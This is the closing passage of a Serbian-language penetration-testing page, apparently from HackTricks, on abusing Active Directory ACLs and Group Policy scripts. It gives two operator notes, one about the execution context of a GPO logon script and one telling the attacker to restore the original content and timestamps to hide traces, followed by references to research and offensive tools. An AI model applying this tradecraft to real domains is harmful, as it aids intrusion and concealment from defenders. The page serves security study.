- Izvršavanje se odvija pod tokenom korisnika za evidentiranje (ne SYSTEM). Opseg je GPO veza (OU, lokacija, domen) na koju se ta skripta primenjuje.
- Nakon upotrebe vratite originalni sadržaj/vremenske oznake.

## References

- [1] [Zloupotreba Active Directory ACL-ova/ACE-ova](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privilegovani nalozi i privilegije tokena](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Ažuriranje putanje ACL napada](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Eskalacija privilegija pomoću ACL-ova u Active Directory-ju](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skeniranje Active Directory privilegija i privilegovanih naloga](https://adsecurity.org/?p=3658)
- [7] [Konstruktor ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operacije nad AD atributima/UAC-om iz Linuxa](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (članstvo u grupi)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking i DPAPI decryption do DC administratora](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: otmica GPO UNC putanja radi izvršavanja koda i NTLM relay-a](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: iskorišćavanje Active Directory GPO-ova putem NTLM relay-a i još mnogo toga](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU se šali? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: iskorišćavanje skrivenih ACL vektora napada na organizacione jedinice u Active Directory-ju](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulacija legitimnih Active Directory usluga na mreži: slučaj iskorišćavanja GPO-a](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
